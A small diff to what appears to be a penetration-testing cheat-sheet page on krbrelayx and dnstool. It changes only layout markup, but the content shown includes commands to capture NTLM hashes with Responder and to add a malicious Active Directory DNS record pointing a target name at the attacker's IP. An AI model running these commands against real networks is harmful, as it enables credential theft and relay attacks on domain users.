@@ -9,8 +9,6 @@ tags: ["Krbrelayx", "dnstools", "active driectory", "ad", "Windows", "dns"]
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Capture NTLM hash
 sudo responder -I tun0
@@ -20,10 +18,6 @@ sudo responder -I tun0
 python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <TARGET_RECORD> --data <LOCAL_IP> <TARGET_IP>
 ```
 
-</div>
-
 <small>*Ref: [krbrelayx tools](https://github.com/dirkjanm/krbrelayx)*</small>
 
 {{< /tabcontent >}}
-
-<br>
